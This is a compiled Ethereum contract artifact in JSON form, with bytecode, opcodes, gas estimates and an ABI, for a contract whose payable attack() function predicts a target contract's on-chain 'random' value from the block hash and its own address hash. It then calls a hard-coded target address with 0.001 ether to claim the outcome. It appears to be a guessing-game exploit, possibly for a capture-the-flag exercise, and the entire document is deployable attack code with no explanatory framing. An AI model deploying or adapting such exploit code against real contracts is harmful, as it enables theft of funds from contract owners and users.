{
	"data": {
		"bytecode": {
			"linkReferences": {},
			"object": "60806040527357a9aab42e84b843e9d9bff383cef4c3f65f3d236000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550610193806100676000396000f300608060405260043610610041576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff1680639e5faafc14610043575b005b61004b61004d565b005b60008060004340925030604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166c01000000000000000000000000028152601401915050604051809103902091508183186001900490506000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16636898f82b66038d7ea4c68000836040518363ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401808281526020019150506000604051808303818588803b15801561014957600080fd5b505af115801561015d573d6000803e3d6000fd5b50505050505050505600a165627a7a72305820d1617a7f10ff60d94923ec86218b447f43072487fbe438f3f47b4b1e7be209170029",
			"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE PUSH20 0x57A9AAB42E84B843E9D9BFF383CEF4C3F65F3D23 PUSH1 0x0 DUP1 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP PUSH2 0x193 DUP1 PUSH2 0x67 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN STOP PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x41 JUMPI PUSH1 0x0 CALLDATALOAD PUSH29 0x100000000000000000000000000000000000000000000000000000000 SWAP1 DIV PUSH4 0xFFFFFFFF AND DUP1 PUSH4 0x9E5FAAFC EQ PUSH2 0x43 JUMPI JUMPDEST STOP JUMPDEST PUSH2 0x4B PUSH2 0x4D JUMP JUMPDEST STOP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x0 NUMBER BLOCKHASH SWAP3 POP ADDRESS PUSH1 0x40 MLOAD DUP1 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH13 0x1000000000000000000000000 MUL DUP2 MSTORE PUSH1 0x14 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 KECCAK256 SWAP2 POP DUP2 DUP4 XOR PUSH1 0x1 SWAP1 DIV SWAP1 POP PUSH1 0x0 DUP1 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x6898F82B PUSH7 0x38D7EA4C68000 DUP4 PUSH1 0x40 MLOAD DUP4 PUSH4 0xFFFFFFFF AND PUSH29 0x100000000000000000000000000000000000000000000000000000000 MUL DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x149 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x15D JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP POP POP POP POP JUMP STOP LOG1 PUSH6 0x627A7A723058 KECCAK256 0xd1 PUSH2 0x7A7F LT SELFDESTRUCT PUSH1 0xD9 0x49 0x23 0xec DUP7 0x21 DUP12 DIFFICULTY PUSH32 0x43072487FBE438F3F47B4B1E7BE2091700290000000000000000000000000000 "
		},
		"gasEstimates": {
			"creation": {
				"codeDepositCost": "80600",
				"executionCost": "20372",
				"totalCost": "100972"
			},
			"external": {
				"": "85",
				"attack()": "infinite"
			}
		},
		"methodIdentifiers": {
			"attack()": "9e5faafc"
		}
	},
	"abi": [
		{
			"constant": false,
			"inputs": [],
			"name": "attack",
			"outputs": [],
			"payable": true,
			"stateMutability": "payable",
			"type": "function"
		},
		{
			"inputs": [],
			"payable": true,
			"stateMutability": "payable",
			"type": "constructor"
		},
		{
			"payable": true,
			"stateMutability": "payable",
			"type": "fallback"
		}
	]
}